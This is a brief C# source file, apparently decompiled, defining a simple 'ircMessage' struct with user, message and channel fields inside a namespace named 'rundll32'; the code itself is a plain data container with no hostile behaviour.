namespace rundll32;

public struct ircMessage
{
	private ircUser _user;

	private string _message;

	private string _channel;

	public ircUser user => _user;

	public string message => _message;

	public string channel => _channel;

	public irc irc => _user.irc;

	public ircMessage(ircUser user, string message, string channel)
	{
		_user = user;
		_message = message;
		_channel = channel;
	}
}
